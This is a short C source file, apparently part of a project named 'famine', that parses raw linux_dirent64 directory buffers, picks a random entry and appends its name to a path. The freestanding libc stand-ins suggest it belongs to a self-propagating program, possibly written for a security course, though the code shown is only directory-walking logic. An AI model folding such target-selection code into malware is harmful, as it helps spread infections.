#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline void update_path(char *path, const char *file)
{
	const unsigned long p_limit = _strlen(path);
	const unsigned long f_limit = _strlen(file);

	_bzero(path + p_limit, PATH_MAX - p_limit);

	for (unsigned long index = 0; index < f_limit; index++)
		path[p_limit + index] = file[index];
}

static inline void update_entry(struct directory *dir, const char *dirent)
{
	unsigned long index = 0;
	unsigned long reclen = 0;

	while (dirent[index])
	{
		reclen = ((struct linux_dirent64 *)(dirent + index))->d_reclen;
		index += reclen;
		dir->entry += 1;
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void update_directory(struct directory *dir, const char *dirent)
{
	unsigned long index = 0;
	unsigned long entry = 0;
	unsigned long reclen = 0;

	update_entry(dir, dirent);

	if (dir->entry == 0)
		Exit(0);

	const unsigned long r_entry = _get_random_integer(dir->entry);

	while (dirent[index])
	{
		if (entry == r_entry)
			break ;
		reclen = ((struct linux_dirent64 *)(dirent + index))->d_reclen;
		index += reclen;
		entry += 1;
	}

	update_path(dir->path, ((struct linux_dirent64 *)(dirent + index))->d_name);
}
